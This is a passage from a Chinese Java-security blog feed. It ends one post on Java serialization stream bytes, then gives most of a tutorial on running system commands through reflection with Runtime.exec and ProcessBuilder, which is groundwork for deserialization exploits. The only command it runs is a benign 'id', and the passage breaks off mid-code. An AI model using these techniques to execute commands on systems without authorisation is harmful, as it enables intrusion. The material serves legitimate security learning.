<em>的内容可以参考</em> <strong>Object Serialization Stream Protocol</strong> <em>, 这里不详细说明了 .</em></p><p>​    <strong>SC_SERIALIZABLE = 0x02</strong> : 如果被序列化的类继承了 <strong>Serializable</strong> 接口 , 则设置该标志 , 并在反序列化时调用的类也需要继承 Serializable 接口 , 并使用默认的反序列化机制 .</p><p>​    <strong>SC_EXTERNALIZABLE = 0x04</strong> : 如果被序列化的类继承了 <strong>Externalizable</strong> 接口 , 则设置该标志 , 并在反序列化时调用的类也需要继承 Externalizable 接口 . 并且在序列化/反序列化过程中要使用 readExternal() 方法和 writeExternal() 方法处理序列化数据 .</p><p>​    <strong>SC_ENUM = 0x10</strong> : 如果被序列化的类是枚举类型 , 则设置该标志 . 同时反序列化时调用的类也必须是枚举类型 .</p><p>​    这里用的不多 , 内容也比较复杂 , 关于枚举类型常量的序列化可以参考* <strong>Serialization of Enum Constants</strong><em>, 这里不详细说明了 .</em></p><p>​    <strong>4. 4c</strong></p><p>​    这里是 “ 类类签名 “ . 即字段类型的类签名 . 注意 , 这里非常容易搞混 ! 是字段类型的类签名 , 不是字段值的类签名 .</p><p>​    也就是说 , 这里填写的是类类签名 , 而不是类签名( 实在有点绕 , 您多理解下. )</p><p>​    弄明白之后就好理解了 , 这里需要填写 “ L “ , 即 0x4C .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-165429.png"                      alt="image-20230417005429330"                ></p><p>​    <strong>5. 7870</strong></p><p>​    <strong>0x78</strong> : 为 Block_data 的结束表示符号 .可以理解为一个原始数据块的结束 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-165551.png"                      alt="image-20230417005550948"                ></p><p>​    <strong>0x70</strong> : 用于在流中指定 Null 引用 . 因为这里字段的字段代表 父类的类描述符号 , 而 <strong>Man</strong> 类仅继承了 <strong>Serializable</strong> 接口 , 并未继承其他类 , 所以这里应指定为 <strong>Null</strong> .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-165602.png"                      alt="image-20230417005601945"                ></p><p>​    至此 , 这段序列化数据就分析完了 , 其实整体来看并不难 , 数据中具体的部分我没有分析，可以直接看软件分析的结果，也能看懂。下一章，我们来看一下更深入的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Java序列化与反序列化&quot;&gt;&lt;a href=&quot;#Java序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;Java序列化与反序列化&quot;&gt;&lt;/a&gt;Java序列化与反序列化&lt;/h3&gt;&lt;p&gt;​    经过前面的深入学习，应该可以深入了解一下Java的</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(5)-Java RCE(Remote Code Execute)</title>
    <link href="http://example.com/2022/11/16/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-5-Java-RCE-Remote-Code-Execute/"/>
    <id>http://example.com/2022/11/16/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-5-Java-RCE-Remote-Code-Execute/</id>
    <published>2022-11-15T17:37:29.000Z</published>
    <updated>2023-04-22T08:02:44.700Z</updated>
    
    <content type="html"><![CDATA[<p>​    上一篇学习了Java反射机制，这篇学习一下RCE，将 Java反射与RCE方式结合在一起。</p><h3 id="Java-lang-Runtime"><a href="#Java-lang-Runtime" class="headerlink" title="Java.lang.Runtime"></a>Java.lang.Runtime</h3><p>​    java.lang.Runtime 类的 exec() 方法是Java中最常见的执行命令的方式 ,</p><p>​    在没有了解 Java 反射机制前 , 可能无法理解真正含义. 现在 , 来看一看它的原理到底是什么 .</p><ol><li>正常情况下 , 我们想要拿到一个除系统类以外的类 , 必须要先 import 后才能使用 . 否则会出现 cannot find symbol 等报错 . 但是在进行利用时 , 系统是不会让你随意加载类的 . <strong>但是 , 通过 Class.forName(className) 获取类则没有这个限制 , 我们可以通过 forName() 方法加载任何类 .</strong></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Runtime</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Class.forname()方法获取任意类：&quot;</span>+cls);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-175714.png"                      alt="image-20230416015714145"                ></p><ol start="2"><li>拿到了 java.lang.Runtime 类后 , 我们肯定想知道该类可调用的方法 . 于是通过 className.getMethods() , className.getDeclaredMethods() 来获取类的方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Runtime</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//className.getMethods()</span></span><br><span class="line">        System.out.println(<span class="string">&quot;getMethods获取方法:&quot;</span>);</span><br><span class="line">        Method[] methods = cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//className.getDeclaredMethods()</span></span><br><span class="line">        System.out.println(<span class="string">&quot;\ngetDeclaredMethods获取的方法&quot;</span>);</span><br><span class="line">        Method[] declareMethods = cls.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-180017.png"                      alt="image-20230416020016852"                ></p><p>​    从输出信息中可以找到我们想要执行的 exec() 方法</p><ol start="3"><li>拿到了类 , 拿到了类的方法 , 就可以通过反射实例化对象并通过 invoke() 调用方法了</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Runtime</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //className.getMethods()</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;getMethods获取方法:&quot;);</span></span><br><span class="line"><span class="comment">//        Method[] methods = cls.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : methods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        //className.getDeclaredMethods()</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;\ngetDeclaredMethods获取的方法&quot;);</span></span><br><span class="line"><span class="comment">//        Method[] declareMethods = cls.getDeclaredMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : methods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">newInstance</span> <span class="variable">nis</span> <span class="operator">=</span> (newInstance)cls.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(nis,<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里是不能执行成功的因为在Runtime类中有private修饰的静态方法</span></span><br><span class="line"><span class="comment">        若想成功必须：1、类必须要有无参构造函数。2、类的构造函数不能私有</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-180238.png"                      alt="image-20230416020238102"                ></p><p>​    发现程序抛出了异常 , 报错信息为 : Exception in thread “main” java.lang.IllegalAccessException: Class test7 can not access a member of class java.lang.Runtime with modifiers “private”</p><p>​    <strong>test7 类无法访问 java.lang.Runtime 类中带有 “private” 修饰符的成员变量 / 成员函数 .</strong></p><p>​    <strong>这会有疑问，第二步明明都是public啊，哪来的private？</strong></p><p>​    <strong>仔细想想，我们在通过 cls.newInstance() 构造实例对象时 , 会默认调用无参构造函数 . 难道这个无参构造函数是私有的吗 ?</strong></p><p>看看源码</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-181304.png"                      alt="image-20230416021304168"                ></p><p>​    可以发现 , java.lang.Runtime 类的构造方法的确使用了 “private” 修饰符 . 我们知道 “private” 修饰符修饰的方法只能在当前类中被调用 , 外部是不可见的 . 那么设计者为什么要这么做呢 ?</p><p>​    这一种比较常见的设计模式 , 被称为 “单例模式” . 在Java从零到一（2）中学过 . 类似一个 Web 应用 , 数据库连接应该只在服务启动时建立一次 , 而不是每次访问数据库时都建立一个连接 .因此开发人员可以把数据库连接写在构造函数中 , 并赋予该函数 “private” 修饰符 . 然后编写一个静态方法来获取该连接 . 这样 , 只有在类初始化时会调用一次构造函数 , 建立数据库连接 . 后面只需要通过静态方法就能获取数据库连接 , 避免了建立多个数据库链接 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-183845.png"                      alt="image-20230416023844878"                ></p><p>​    只需要确保实例化过程只进行一次就行了 , 以 Java 反射为例 , 在类初始化时会执行 static{} 代码块中的内容( 详见本文开头 ) , 所以会执行一遍实例化过程 . 由于该过程被赋予了 “private” 修饰符 , 所以后面就再也不能访问它了 . 结果是一样的 .</p><p>​    <strong>这里也引出了 class.newInstance() 方法执行成功的两个关键点 :</strong></p><p><strong>1.类必须要有无参构造函数 .</strong></p><p><strong>2.类的构造函数不能是私有的 , 也就是不能通过 “private” 修饰符来修饰构造函数 .</strong></p><p>​    有了这些结论 , 我们就可以通过 Java 反射机制来执行 exec() 方法了 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Runtime</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        //className.getMethods()</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;getMethods获取方法:&quot;);</span></span><br><span class="line"><span class="comment">//        Method[] methods = cls.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : methods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        //className.getDeclaredMethods()</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;\ngetDeclaredMethods获取的方法&quot;);</span></span><br><span class="line"><span class="comment">//        Method[] declareMethods = cls.getDeclaredMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : methods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        newInstance nis = (newInstance)cls.getDeclaredConstructor().newInstance();</span></span><br><span class="line"><span class="comment">//        Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(nis,&quot;id&quot;);</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里是不能执行成功的因为在Runtime类中有private修饰的静态方法</span></span><br><span class="line"><span class="comment">        若想成功必须：1、类必须要有无参构造函数。2、类的构造函数不能私有</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">mGetRuntime</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">mExec</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> mGetRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) mExec.invoke(obj, <span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//标准输出当作输入字节流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="comment">//字节流转换为字符流</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">        <span class="comment">//提供缓冲区</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-053154.png"                      alt="image-20230416133154263"                ></p><p>​    成功通过 java.lang.Runtime.getRuntime().exec() 调用系统命令 id .</p><p><strong>通过 Method mGetRuntime = cls.getMethod(“getRuntime”); 和 Method mExec = cls.getMethod(“exec”,String.class); 分别获取 getRuntime() 方法和 exec() 方法.</strong></p><p><strong>通过 getRuntime() 的 invoke(null) 方法获取 Runtime 实例对象 . 由于调用的是静态方法 , 所以省略 obj 参数 , 由于 getRuntime() 方法没有参数 , 所以这里参数数组为 null .</strong></p><p><strong>通过 exec() 的 invoke(obj , args[]) 方法来执行命令 . 这里 obj 是 Runtime 实例对象 , 通过上一步骤获得 , 参数则为系统命令 “id” .</strong></p><p><strong>获取执行结果的字节流 , 将其处理成字符流 , 最后输出字符串 .</strong></p><ol start="4"><li><strong>关于 Object obj = mGetRuntime.invoke(null); 这个点需要补充一些东西.</strong></li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-190436.png"                      alt="image-20230416030435889"                ></p><p>​    这里为什么 invoke() 的方法参数为什么是一个类( Class ) ？</p><p>​    可以通过 对象.方法名 来调用实例方法 , 类名.方法名 来调用静态方法 , 那么反过来 , <strong>方法名.invoke(对象)</strong> 不就可以映射成 <strong>方法名.invoke(类)</strong> 嘛</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-190521.png"                      alt="image-20230416030520674"                ></p><hr><h3 id="Java-lang-ProcessBuilder"><a href="#Java-lang-ProcessBuilder" class="headerlink" title="Java.lang.ProcessBuilder"></a>Java.lang.ProcessBuilder</h3><p>​    提到了可以通过 java.lang.Runtime.getRuntime().exec() 方法执行系统命令 , 那么去看看exec() 方法是如何执行系统命令的 ?</p><p>​    看看源码，看最简单的重载形式</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-053513.png"                      alt="image-20230416133513225"                ></p><p>​    该方法返回类对 exec() 方法的调用 , 那么这里返回的 exec() 方法是什么样的呢 ?</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-054906.png"                      alt="image-20230416134905806"                ></p><p>​    cmdarray : 一个字符串数组 , 包含要执行命令及参数 .</p><p>​    envp : 一个字符串数组 , 其中的每个元素都是键值对格式的环境变量 , 如果子进程继承当前进程的环境变量设置 , 则该值为 null.</p><p>​    dir : 一个文件对象 , 代表子进程的工作目录 . 如果子进程继承当前进程的工作目录 , 则该值为 null.</p><p>​    可以看出 , exec()方法执行命令的原理是通过 ProcessBuilder 对象创建了一个执行命令的子进程 . 那么是否可以直接通过 ProcessBuilder 类来执行命令呢 ?</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-055229.png"                      alt="image-20230416135228880"                ></p><p>​    因为并没有指定 envp 和 dir 两个参数的值 , 因此不需要关注 environment() 和 directory() 这两个方法 , 直接来看 start() 方法 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-055944.png"                      alt="image-20230416135943622"                ></p><p>​    看看大概意思是转换 cmdarray 数组，提取其中要执行的命令，判断该命令是否可以执行。并且判断命令是否存在对应参数，然后进行子进程的创建。</p><p>​    那根据这个意思，我们只需要调用 java.lang.ProcessBuilder.start() 方法 , 就可以创建子进程来执行命令了 .</p><h4 id="执行不带参数的系统命令"><a href="#执行不带参数的系统命令" class="headerlink" title="执行不带参数的系统命令"></a>执行不带参数的系统命令</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">processBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">processBuilder</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下面需要构造 ProcessBuilder 类的实例对象</span></span><br><span class="line">        <span class="comment">//但是 ProcessBuilder 的构造函数都是有参构造函数，所以不能使用 class.newInstance()来构造实例对象</span></span><br><span class="line">        <span class="comment">//注意，构造方法的参数 cmdarray 的类型是 List</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor(List.class).newInstance(List.of(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">startCmd</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行start()方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (Process) startCmd.invoke(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将进程p的标准输出流转化为输入字节流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="comment">//字节流转化为字符流</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span 